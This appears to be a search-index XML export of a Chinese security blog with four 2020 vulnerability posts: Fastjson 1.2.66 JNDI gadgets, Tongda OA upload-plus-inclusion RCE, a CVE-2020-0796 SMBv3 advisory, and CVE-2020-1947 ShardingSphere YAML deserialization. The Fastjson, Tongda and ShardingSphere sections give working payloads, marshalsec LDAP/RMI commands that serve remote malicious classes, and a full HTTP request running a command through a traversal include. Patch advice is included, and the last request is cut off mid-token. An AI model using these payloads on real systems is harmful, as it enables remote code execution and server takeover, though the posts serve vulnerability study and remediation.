<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造]]></title>
    <url>%2F2020%2F03%2F22%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%26%E5%A4%8D%E7%8E%B0%E3%80%91Fastjson1.2.66%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E5%90%AB4%E4%B8%AAGadget%E5%88%A9%E7%94%A8Poc%E6%9E%84%E9%80%A0%2F</url>
    <content type="text"><![CDATA[【漏洞分析&amp;复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造 一、事件背景近日，Fastjson发布了新版本1.2.67新增了autoType黑名单，在1.2.66及之前版本中存在大量通过JNDI注入绕过黑名单限制的而导致远程代码执行漏洞，远程攻击者可以通过构造的攻击代码触发远程代码执行漏洞，最终可以获取到服务器的控制权限。 二、漏洞信息 漏洞名称 Fastjson 远程代码执行漏洞 CVE编号 - 影响范围 &lt;=1.2.66 威胁等级 高危 公开时间 2020年3月19日 三、漏洞分析3.1 补丁对比 通过对比1.2.66和1.2.67版本ParserConfig.java文件中checkautotype类的denyHashCode发现新增了16个黑名单Gadget 注：1.2.42版本之前的黑名单是以denyList形式，存在被黑客利用里面Gadget来攻击低版本的fastjson风险，之后版本码中黑名单都是以hashCode的方式存放在源码里，denyHashCode的计算方式略微复杂，增加了攻击门槛。 jndi注入产生的原因可以归结到以下4点 12341、lookup参数可控。2、InitialContext类及他的子类的lookup方法允许动态协议转换3、lookup查找的对象是Reference类型及其子类4、当远程调用类的时候默认会在rmi服务器中的classpath中查找，如果不存在就会去url地址去加载类。如果都加载不到就会失败。 就可以实现远程加载恶意的对象，实现远程代码执行。我们发现存在3种方法，可以通过jndi注入导致远程代码执行: 1231.rmi、通过jndi reference远程调用object方法2.LDAP 通过序列化对象，JNDI Referene，ldap地址3.CORBA IOR 远程获取实现类 可以使用marshalsec-0.0.3-SNAPSHOT-all.jar开启rmi/ldap 调用web服务器中的恶意对象 12341. LDAP 方式java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Calc2. RMI 方式java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8000/#Calc 本次将分析已公开的4个Gadget JndiObjectFactory、AnterosDBCPConfig 、CacheJndiTmLookup和JtaTransactionConfig 黑名单里有10几个Gadget，后续慢慢研究 1.org.apache.shiro.jndi.JndiObjectFactory在org.apache.shiro-core-1.5.1.jar 包中 1234567public T getInstance() &#123; try &#123; if(requiredType != null) &#123; return requiredType.cast(this.lookup(resourceName, requiredType)); &#125; else &#123; return (T) this.lookup(resourceName); &#125; resourceName 参数可控poc构造1: 1&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125; 2. br.com.anteros.dbcp.AnterosDBCPConfig找lookupgetObjectOrPerformJndiLookup 123456789101112private Object getObjectOrPerformJndiLookup(Object object)&#123; if (object instanceof String) &#123; try &#123; InitialContext initCtx = new InitialContext(); return initCtx.lookup((String) object); &#125; catch (NamingException e) &#123; throw new IllegalArgumentException(e); &#125; &#125; return object; 跟一下调用，发现是传递参数为metricRegistrypoc构造2: 1&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125; 3. org.apache.ignite.cache.jta.jndi.CacheJndiTmLookups 的值为列表jndiNames经过iterator().next遍历返回的对象序列再转化为Sting，jndiNames也是可控poc构造3: 1&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125; 4. com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig 12345678910public void setProperties(Properties props) throws SQLException, TransactionException &#123; String utxName = null; try &#123; utxName = (String) props.get(&quot;UserTransaction&quot;); InitialContext initCtx = new InitialContext(); userTransaction = (UserTransaction) initCtx.lookup(utxName); &#125; catch (NamingException e) &#123; throw new SqlMapException(&quot;Error initializing JtaTransactionConfig while looking up UserTransaction (&quot; + utxName + &quot;). Cause: &quot; + e); &#125;&#125; UserTransaction参数 可控poc构造4: 1&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;&#125; 四、漏洞复现*本次复现fastsjon 1.2.66版本 为例第1个：fastjson 受org.apache.shiro.jndi.JndiObjectFactory影响导致RCE第2个：fastjson 受br.com.anteros.dbcp.AnterosDBCPConfig影响导致RCE第3个：fastjson 受org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup影响导致RCE第4个：fastjson 受com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig影响导致RCE 五、修复建议1.官方已发布新版本https://github.com/alibaba/fastjson/releases/tag/1.2.672 修复建议Fastjson默认关闭autotype，如果项目中不需要该功能，可以删除以下代码：ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 六、附录本次分析及复现的相关工具地址https://github.com/SecurityCN/Vulnerability-analysis/tree/master/fastjson 参考：*https://github.com/alibaba/fastjson/releases*https://mp.weixin.qq.com/s/4JzPRolR0cELL5g9bWM_eA*https://github.com/threedr3am/learnjavabug]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>JAVA-Web安全</tag>
        <tag>安全研究</tag>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【漏洞分析&漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现]]></title>
    <url>%2F2020%2F03%2F17%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%26%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[【漏洞分析&amp;漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现 漏洞名称 通达OA文件包含漏洞 CVE编号 - 影响范围 通达OA v11版本 威胁等级 高危 公开时间#### 一、事件背景 近日，通达OA在官方论坛发布了紧急通知，提供了针对部分用户反馈遭到勒索病毒攻击的安全加固程序。根据公告，遭受攻击的OA服务器首页被恶意篡改，伪装成OA系统错误提示页面让用户下载安装插件，同时服务器上文件被勒索病毒重命名加密，论坛中有多个用户反馈中招（具体现象为：主页被篡改、站点文件扩展名被修改、并生成一个勒索提示文本文件），论坛地址：http://club.tongda2000.com/forum.php?mod=viewthread&amp;tid=128367&amp;extra=page%3D1 通过在v11.3版本的测试发现全版本的任意文件上传漏洞结合v11版本的文件包含漏洞可以造成远程命令执行，默认为System权限，恶意攻击者可以成功上传Webshell后门，并进一步释放勒索病毒，危害较大。 二、漏洞信息 漏洞名称 通达OA任意文件上传漏洞 CVE编号 - 影响范围 通达OA 2013/2013增强/2015/2016/2017/v11版本 威胁等级 高危 公开时间 2020年3月13日 2020年3月13日 三、漏洞分析3.1 补丁对比http://www.tongda2000.com/news/673.php 根据通达官方的修复说明，需要替换MYOA\webroot下的文件下载官方发布的所有版本的补丁分析后发现：2013/2013增强/2015/2016/2017版本的补丁只有1个文件ispirit\im\upload.php；v11版本的的补丁文件与此次漏洞相关的有ispirit\im\upload.php 和ispirit/interface/gateway.php 等多个文件，所以v11 版本同时受2个漏洞的影响，其他版本暂不确定。 本次分析以通达v11 版本 为例 注意：通达OA的php文件采用的是zend54 加密，可以使用 SeayDzend工具进行解密，工具下载地址见附录 补丁1: ispirit\im\upload.php 任意文件上传漏洞对比补丁前后发现 主要是为了修复未登录任意上传文件，有2处更改首先第1处，就是关于登陆验证文件’./auth.php’ 的调用但在upload.php未修复前，有一个if判断如果$P存在且非空就不需要经过auth.php验证即可执行后续代码。利用此处逻辑漏洞可绕过登陆验证直接上传文件。补丁文件中是直接强制include_once ‘./auth.php’; 进行登录验证。第2处，修改是在upload.php中 增加了登录的与数据库中的Session校验 12345678910$time = time();$sql = &apos;select * from im_recent where ((from_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos; and to_id = \&apos;&apos; . $DEST_UID . &apos;\&apos;) or (from_id = \&apos;&apos; . $DEST_UID . &apos;\&apos; and to_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos;)) and type = \&apos;1\&apos;&apos;;$cursor = exequery(TD::conn(), $sql);if (0 &lt; mysql_num_rows($cursor)) &#123; $sql1 = &apos;UPDATE im_recent SET update_time = \&apos;&apos; . $time . &apos;\&apos; WHERE ((from_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos; and to_id = \&apos;&apos; . $DEST_UID . &apos;\&apos;) or (from_id = \&apos;&apos; . $DEST_UID . &apos;\&apos; and to_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos;)) and type = \&apos;1\&apos;&apos;; exequery(TD::conn(), $sql1);&#125; else &#123; $sql2 = &apos;INSERT INTO im_recent (from_id,to_id,update_time,type) VALUES (\&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos;,\&apos;&apos; . $DEST_UID . &apos;\&apos;,\&apos;&apos; . $time . &apos;\&apos;,\&apos;1\&apos;)&apos;; exequery(TD::conn(), $sql2);&#125; 分析完补丁之后我们来整体分析下存在漏洞upload.php 文件1.先判断$P 参数是否存在调用Session和 auth登录认证，当$P非空时此处可以绕过auth.php登录验证2.判断$DEST_UID是否为空；其次如果DEST_UID 中存在有,，则通过intval获取整数值；最后当$DEST_UID=0时，UPLOAD_MODE要为2 否接收方ID无效。3.UPLOAD_MODE 有3种模式，vociemsg\weixunshare\im，其中im是默认模式，$_FILES全局变量大于等于1的时候(就是有文件上传的时候)，会调用upload方法进行处理，这里的文件上传的 name 为name=”ATTACHMENT 跟进inc\utility_file.php 的upload方法,发现有个文件名校验函数is_uploadable我们看下关于文件后缀名的获取方式，是通过strrpos 函数获取.最后一次出现的位置开始到后面的3个字符串，不能为php,其实黑名单有很多种方式绕过，比如上传后缀名为.phtml，.cpt 等都可以绕过1234567891011121314function is_uploadable($FILE_NAME)&#123; $POS = strrpos($FILE_NAME, &quot;.&quot;); if ($POS === false) &#123; $EXT_NAME = $FILE_NAME; &#125; else &#123; if (strtolower(substr($FILE_NAME, $POS + 1, 3)) == &quot;php&quot;) &#123; return false; &#125; $EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1)); &#125; 补丁2：ispirit/interface/gateway.php 文件包含漏洞通过对比v11.3版本的补丁中gateway.php前后代码发现 第47行后面，增加了对url地址种的..符号的判断，防止用户读取其他目录文件。通读修复之前的代码发现，整个流程为foreach循环解析$json，如果$key键等于字符串url ,则$url={$key所对应的值}，如果$url非空则调用 ，且数据中包含’general/‘ or ‘ispirit/‘or ‘module/‘时，就会调用include_once对$url进行包含。 123456789101112131415161718192021222324252627if ($json) &#123; $json = stripcslashes($json); $json = (array) json_decode($json); foreach ($json as $key =&gt; $val ) &#123; if ($key == &quot;data&quot;) &#123; $val = (array) $val; foreach ($val as $keys =&gt; $value ) &#123; $keys = $value; &#125; &#125; if ($key == &quot;url&quot;) &#123; $url = $val; &#125; &#125; if ($url != &quot;&quot;) &#123; if (substr($url, 0, 1) == &quot;/&quot;) &#123; $url = substr($url, 1); &#125; if ((strpos($url, &quot;general/&quot;) !== false) || (strpos($url, &quot;ispirit/&quot;) !== false) || (strpos($url, &quot;module/&quot;) !== false)) &#123; include_once $url; &#125; &#125; 那么就可以在url中传入../ 进行跨目录，从而可以包含第1个漏洞上传的php文件，造成RCE 四、漏洞复现*本次复现以通达OAv11.3 版本 为例第1个漏洞的Poc的构造需要满足四个条件: P非空、DEST_UID非空且为数字、UPLOAD_MODE为1或2或3、ATTACHMENT的filename后缀名不能为php最后构造的Payload如下上传了1个文件名为a.phtml的php文件 绕过黑名单检测路径为 attach/im/2003/72566742.a.phtml 但该目录不在webroot下不能直接执行webshell，才需要利用后面的文件包含漏洞跨目录解析 12345678910111213POST /ispirit/interface/gateway.php HTTP/1.1Host: 192.168.80.1:8000User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie:PHPSESSID=pr7a35d0sh8gheukb4mg6990h4;Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 70json=&#123;&quot;url&quot;:&quot;module/../../attach/im/2003/72566742.a.phtml&quot;&#125;&amp;cmd=whoami 最后RCE成功，有一点需要提醒下，通达OA开启了 disable_funcation 功能 很多常见的命令执行函数如 exec、eval、system等都被禁止了，需要bypass想学习绕过的可以参考：https://www.cnblogs.com/-qing-/p/10944118.html 五、修复建议官方提供了以下可能受到影响的版本的补丁：2013版、2013增强版、2015版、2016版、2017版、V11版本下载地址： 123456V11版：http://cdndown.tongda2000.com/oa/security/2020_A1.11.3.exe2017版：http://cdndown.tongda2000.com/oa/security/2020_A1.10.19.exe2016版：http://cdndown.tongda2000.com/oa/security/2020_A1.9.13.exe2015版：http://cdndown.tongda2000.com/oa/security/2020_A1.8.15.exe2013增强版：http://cdndown.tongda2000.com/oa/security/2020_A1.7.25.exe2013版：http://cdndown.tongda2000.com/oa/security/2020_A1.6.20.exe 六、附录本次分析及复现的相关工具地址https://github.com/SecurityCN/Vulnerability-analysis/tree/master/通达OA3月漏洞 参考：*http://club.tongda2000.com/forum.php?mod=viewthread&amp;tid=128377&amp;extra=page%3D1*https://www.webshell.cc/6379.html*https://www.cnblogs.com/-qing-/p/10944118.html]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>安全研究</tag>
        <tag>PHP-Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【漏洞通告】CVE-2020-0796/Windows SMBv3远程代码执行漏洞安全通告(内含Exp视频和检测方法)]]></title>
    <url>%2F2020%2F03%2F12%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E9%80%9A%E5%91%8A%E3%80%91CVE-2020-0796Windows%20SMBv3%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8%E9%80%9A%E5%91%8A%EF%BC%88%E5%86%85%E5%90%ABExp%E8%A7%86%E9%A2%91%E5%92%8C%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%EF%BC%89%2F</url>
    <content type="text"><![CDATA[【漏洞通告】CVE-2020-0796/Windows SMBv3远程代码执行漏洞安全通告(内含Exp视频和检测方法) 一、事件背景3月10日，微软发布了KB4551762安全更新，修复了在微软服务器消息块3.1.1（SMBv3）中发现的预授权RCE Windows 10漏洞（CVE-2020-0796）。在2020年3月补丁星期二活动日披露了关于该漏洞的细节，两天后公布安全更新。根据微软的说法，KB4551762安全更新解决的是“网络通信协议的问题，它提供共享访问文件、打印机和串行端口”。 二、漏洞信息 漏洞名称 Windows SMBv3远程代码执行漏洞 CVE编号 CVE-2020-0796 影响范围 影响Windows 10 1903及之后的各个版本 威胁等级 严重 公开时间 2020年3月10日 三、影响范围漏洞影响Windows 10 1903及之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。 12345678Windows 10 Version 1903 for 32-bit SystemsWindows 10 Version 1903 for x64-based SystemsWindows 10 Version 1903 for ARM64-based SystemsWindows Server, version 1903 (Server Core installation)Windows 10 Version 1909 for 32-bit SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for ARM64-based SystemsWindows Server, version 1909 (Server Core installation) 正是目前主流操作系统版本，在个人、企业环境应用广泛。 四、漏洞分析SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。该漏洞的后果十分接近永恒之蓝系列，都利用Windows SMB漏洞远程攻击获取系统最高权限，WannaCry勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。 五、漏洞复现5.1 检测工具目前已公开漏洞检查工具https://github.com/SecurityCN/SMBGhost nmap扫描CVE-2020-0796的nse脚本https://github.com/SecurityCN/Vulnerability-analysis/blob/master/CVE-2020-0796/cve-2020-0796.nse 5.2 漏洞复现SophosLabs的Offensive Research团队开发并共享了一个本地特权升级概念验证的漏洞利用演示视频，该漏洞使具有低级特权的攻击者可以获得系统级特权Kryptos Logic表示：“即使不存在要分析的补丁程序，也很难发现SMB漏洞。”恶意攻击者几乎可以自己对CVE-2020-0796进行利用。 详细可以观看视频 *视频来自网络 六、修复建议6.1 升级微软官方已发布漏洞修复更新， 及时更新系统补丁——设置-&gt;更新和安全-&gt;Windows更新，点击“检查更新”，根据业务情况开展评估，下载并安装相应的安全补丁，更新后重启系统生效，并观察系统及业务运行状态。 下载离线补丁包：https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762 6.2 缓解措施对于暂时无法应用此安全更新的管理员，微软提供了针对SMB服务器的缓解措施，并建议使用此PowerShell命令禁用SMBv3压缩（无需重新启动，不会阻止SMB客户端的利用）： 123Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot; DisableCompression -Type DWORD -Value 1 -Force 此外，还建议企业客户在企业外围防火墙处阻止TCP端口445，防止试图利用此漏洞对SMB服务器进行攻击。 参考：*https://www.bleepingcomputer.com/news/security/microsoft-releases-kb4551762-security-update-for-smbv3-vulnerability/*https://github.com/SecurityCN/SMBGhost*https://gist.github.com/nikallass/40f3215e6294e94cde78ca60dbe07394]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>漏洞通告</tag>
        <tag>Windows安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【漏洞分析&环境搭建】CVE-2020-1947/Apache ShardingSphere UI YAML解析远程代码执行漏洞]]></title>
    <url>%2F2020%2F03%2F12%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%26%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%91CVE-2020-1947_Apache_ShardingSphere%20UI%20YAML%E8%A7%A3%E6%9E%90%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[##【漏洞分析&amp;环境搭建】CVE-2020-1947/Apache ShardingSphere UI YAML解析远程代码执行漏洞 一、事件背景近日，Apache官方发布了ShardingSphere 新版本修复了一个YAML解析导致的远程代码执行漏洞（CVE-2020-1947）。Apache ShardingSphere是一套开源的分布式数据库中间件解决方案组成的生态圈，它由Sharding-JDBC、Sharding-Proxy和Sharding-Sidecar（规划中）这3款相互独立，却又能够混合部署配合使用的产品组成。它们均提供标准化的数据分片、分布式事务和数据库治理功能，可适用于如Java同构、异构语言、云原生等各种多样化的应用场景。 二、漏洞信息 漏洞名称 Apache ShardingSphere UI YAML解析远程代码执行漏洞 CVE编号 CVE-2020-1947 影响范围 Apache ShardingSphere UI &lt;= 4.0.1 威胁等级 高危 公开时间 2020年3月10日 三、漏洞分析3.1 补丁对比https://github.com/apache/incubator-shardingsphere/releases通过4.0.1 版本的change-log 中的Enhancement 可以看到添加了一个类过滤器构造函数以限制来自YAML的非法类。 incubator-shardingsphere-4.0.1\sharding-core\sharding-core-common\src\main\java\org\apache\shardingsphere\core\yaml\engine\ClassFilterConstructor.java 1234567891011121314public final class ClassFilterConstructor extends Constructor &#123; private final Collection&lt;Class&lt;?&gt;&gt; acceptClasses; @Override protected Class&lt;?&gt; getClassForName(final String name) throws ClassNotFoundException &#123; for (Class&lt;? extends Object&gt; each : acceptClasses) &#123; if (name.equals(each.getName())) &#123; return super.getClassForName(name); &#125; &#125; throw new IllegalArgumentException(String.format(&quot;Class is not accepted: %s&quot;, name)); &#125;&#125; 添加了一个白名单类acceptClasses列表用for each进行遍历，其他危险的类调用将会被拒绝，如本次Poc中的调用类JdbcRowSetImpl 再看4.0.0 版本中src/main/java/org/apache/shardingsphere/ui/util/ConfigurationYamlConverter.java 直接使用unmarshal方法对输入的YAML直接进行解析，没有做校验。那么就可以参考Fastjson的反序列化漏洞，通过com.sun.rowset.JdbcRowSetImpl类远程调用来进行JNDI注入。漏洞触发点就是YAML 四、漏洞复现4.1 搭建 Apache ShardingSphere UI环境 github下载的 Apache ShardingSphere UI 需要编译之后使用 12345编译过程#wget -c https://github.com/apache/incubator-shardingsphere/archive/4.0.0.tar.gz#cd incubator-shardingsphere/shrding-ui/#mvn clean package -PreleaseGet the package in shardingsphere-ui/shardingsphere-ui-distribution/shardingsphere-ui-bin-distribution/target/apache-shardingsphere-incubating-$&#123;latest.release.version&#125;-shardingsphere-ui-bin.tar.gz 也可以在官网下载Linux版本二进制程序包 （建议大家用此方法）https://shardingsphere.apache.org/document/current/cn/downloads/下载地址：https://mirrors.tuna.tsinghua.edu.cn/apache/incubator/shardingsphere/4.0.0/apache-shardingsphere-incubating-4.0.0-sharding-ui-bin.tar.gz解压tar -xf apache-shardingsphere-incubating-4.0.0-sharding-ui-bin.tar.gz sharding-ui是一个标准的springboot程序，可以通过conf/application.properties配置相关信息 可以看到默认监听 8088 端口，默认管理员口令为 admin/admin （生产环境建议修改密码）进入程序目录运行启动程序bin/start.sh通过浏览器访问8088端口 使用默认口令即可登录成功 添加1个注册中心 Zookeeper*注意：这里不一定需要搭建Zookeeper，只有填入一个地址即可（不能填写127.0.0.1，否则报错）如果想搭建可以参考教程https://www.jianshu.com/p/a5fda39f20d0 4.2 使用Poc进行验证 构造ExportObject并编译ExportObject.java 12将ExportObject.java编译javac ExportObject.java 2.启动HTTPserver 12在ExportObject.class当前目录打开终端中执行python -m SimpleHTTPServer 启动Httpserver，地址为http://192.168.80.1:8000 利用marshalsec工具启用ldap或rmi 监听1389端口1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.80.1:8000/#ExportObject 发送Poc 触发YAMLPoc12345&#123; &quot;name&quot;: &quot;CVE-2020-1947&quot;, &quot;ruleConfiguration&quot;: &quot; encryptors:\n encryptor_aes:\n type: aes\n props:\n aes.key.value: 123456abc\n encryptor_md5:\n type: md5\n tables:\n t_encrypt:\n columns:\n user_id:\n plainColumn: user_plain\n cipherColumn: user_cipher\n encryptor: encryptor_aes\n order_id:\n cipherColumn: order_cipher\n encryptor: encryptor_md5&quot;, &quot;dataSourceConfiguration&quot;: &quot;!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: ldap://192.168.80.1:1389/ExportObject\n autoCommit: true&quot;&#125; 完整请求 1234567891011121314151617POST /api/schema HTTP/1.1Host: 192.168.80.138:8088User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: application/json, text/plain, */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateAccess-Token: eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsImJhc2U2NCI6eyJlbmNvZGVUYWJsZSI6WzY1LDY2LDY3LDY4LDY5LDcwLDcxLDcyLDczLDc0LDc1LDc2LDc3LDc4LDc5LDgwLDgxLDgyLDgzLDg0LDg1LDg2LDg3LDg4LDg5LDkwLDk3LDk4LDk5LDEwMCwxMDEsMTAyLDEwMywxMDQsMTA1LDEwNiwxMDcsMTA4LDEwOSwxMTAsMTExLDExMiwxMTMsMTE0LDExNSwxMTYsMTE3LDExOCwxMTksMTIwLDEyMSwxMjIsNDgsNDksNTAsNTEsNTIsNTMsNTQsNTUsNTYsNTcsNDMsNDddLCJkZWNvZGVUYWJsZSI6Wy0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLDYyLC0xLDYyLC0xLDYzLDUyLDUzLDU0LDU1LDU2LDU3LDU4LDU5LDYwLDYxLC0xLC0xLC0xLC0xLC0xLC0xLC0xLDAsMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTcsMTgsMTksMjAsMjEsMjIsMjMsMjQsMjUsLTEsLTEsLTEsLTEsNjMsLTEsMjYsMjcsMjgsMjksMzAsMzEsMzIsMzMsMzQsMzUsMzYsMzcsMzgsMzksNDAsNDEsNDIsNDMsNDQsNDUsNDYsNDcsNDgsNDksNTAsNTFdLCJkZWNvZGVTaXplIjozLCJlbmNvZGVTaXplIjo0LCJQQUQiOjYxLCJwYWQiOjYxLCJ1bmVuY29kZWRCbG9ja1NpemUiOjMsImVuY29kZWRCbG9ja1NpemUiOjQsImxpbmVMZW5ndGgiOjAsImNodW5rU2VwYXJhdG9yTGVuZ3RoIjoyfSwiZ3NvbiI6eyJjYWxscyI6eyJ0aHJlYWRMb2NhbEhhc2hDb2RlIjoxMzk4MDMyNzAxfSwidHlwZVRva2VuQ2FjaGUiOnsiaW50Ijp7fSwiamF2YS5sYW5nLkJvb2xlYW4iOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwucmVmbGVjdC5QcmVKYXZhOVJlZmxlY3Rpb25BY2Nlc3NvciI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlJlZmxlY3RpdmVUeXBlQWRhcHRlckZhY3RvcnkiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5Kc29uQWRhcHRlckFubm90YXRpb25UeXBlQWRhcHRlckZhY3RvcnkiOnt9LCJjb20uZ29vZ2xlLmdzb24uVHlwZUFkYXB0ZXJGYWN0b3J5Ijp7fSwib3JnLmFwYWNoZS5jb21tb25zLmNvZGVjLmJpbmFyeS5CYXNlNjQiOnt9LCJqYXZhLnV0aWwuTWFwXHUwMDNjY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSwgY29tLmdvb2dsZS5nc29uLlR5cGVBZGFwdGVyXHUwMDNjP1x1MDAzZVx1MDAzZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlR5cGVBZGFwdGVycyQzNSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5FeGNsdWRlciI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLkRhdGVUeXBlQWRhcHRlciQxIjp7fSwiY29tLmdvb2dsZS5nc29uLlR5cGVBZGFwdGVyXHUwMDNjP1x1MDAzZSI6e30sImJvb2xlYW4iOnt9LCJkb3VibGUiOnt9LCJqYXZhLnV0aWwuTGlzdFx1MDAzY2NvbS5nb29nbGUuZ3Nvbi5UeXBlQWRhcHRlckZhY3RvcnlcdTAwM2UiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5UeXBlQWRhcHRlcnMkMzAiOnt9LCJqYXZhLmxhbmcuU3RyaW5nIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDI2Ijp7fSwiY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5GaWVsZE5hbWluZ1N0cmF0ZWd5Ijp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDMyIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVGltZVR5cGVBZGFwdGVyJDEiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuQ29uc3RydWN0b3JDb25zdHJ1Y3RvciI6e30sImphdmEudXRpbC5NYXBcdTAwM2NqYXZhLmxhbmcucmVmbGVjdC5UeXBlLCBjb20uZ29vZ2xlLmdzb24uSW5zdGFuY2VDcmVhdG9yXHUwMDNjP1x1MDAzZVx1MDAzZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlNxbERhdGVUeXBlQWRhcHRlciQxIjp7fSwiY29tLmdvb2dsZS5nc29uLkV4Y2x1c2lvblN0cmF0ZWd5Ijp7fSwiamF2YS5sYW5nLkJ5dGUiOnt9LCJqYXZhLmxhbmcuQ2xhc3NcdTAwM2M/XHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLkluc3RhbmNlQ3JlYXRvclx1MDAzYz